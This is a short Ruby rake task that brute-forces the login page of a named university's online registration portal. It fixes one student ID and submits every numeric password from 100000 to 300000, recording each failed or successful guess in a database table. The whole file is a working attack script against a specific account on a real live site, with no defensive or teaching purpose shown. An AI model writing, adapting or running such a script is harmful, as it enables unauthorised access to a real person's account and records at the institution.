task try_passwords: :environment do
	(100000..300000).each do |i|
		a = Mechanize.new{ |agent| agent.follow_meta_refresh = true }
		a.get('https://alexreg.aast.edu/aastreg/frm_login.aspx') do |page|
			@z = page
		end
		form = @z.form_with(:id => 'aspnetForm')
		form['ctl00$ContentPlaceHolder1$UserName'] = 14102222
		form['ctl00$ContentPlaceHolder1$Password'] = i
		response = form.submit
		if response.body.include?("How To use New Online Registration Video")
			puts "Failed for #{i}"
			Trial.create(password:i)
		else
			puts "Successful for #{i}"
			Trial.create(password:i, successful:true)
		end
	end
end